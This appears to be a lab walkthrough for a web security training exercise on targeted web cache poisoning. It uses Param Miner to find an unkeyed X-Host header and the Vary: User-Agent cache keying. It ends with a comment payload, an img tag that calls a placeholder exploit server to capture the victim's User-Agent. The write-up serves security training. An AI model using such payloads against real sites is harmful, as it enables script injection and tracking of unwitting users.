Title: Targeted web cache poisoning using an unknown header
Level: Practitioner
Desc: This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs. 
Hint from the blog:
`The Vary header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed. It is commonly used to specify that the User-Agent header is keyed, for example, so that if the mobile version of a website is cached, this won't be served to non-mobile users by mistake. `


# Walkthrough:

<img width="1375" height="340" alt="image" src="https://github.com/user-attachments/assets/387cd7a1-a529-4c52-bdbc-58da3310cb27" />


I install extension: param miner

On the / of page on GET request I do Guess Headers:
<img width="1048" height="657" alt="image" src="https://github.com/user-attachments/assets/7c98d812-9155-48c2-a463-f5c1709ea199" />

Here we can see the output from param miner: 
<img width="1201" height="725" alt="image" src="https://github.com/user-attachments/assets/d8d69c96-25d8-4957-8f49-227bd49e88a1" />

Value from X-Host header is reflected on the response: 
<img width="1354" height="440" alt="image" src="https://github.com/user-attachments/assets/3532e41a-9340-4d04-8eb6-147bfd684155" />

So now I found a way to inject my payload to cache and also I can manipulate whom the cache with injection apprears to by using User-Agent:
<img width="1565" height="531" alt="image" src="https://github.com/user-attachments/assets/23cd04af-2bd8-45c3-9138-8861ddcde26e" />

Now I need to know, which User-Agent my victim uses. 
So in comment section I leave this payload to catch victim's browser in the log.
`<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />`
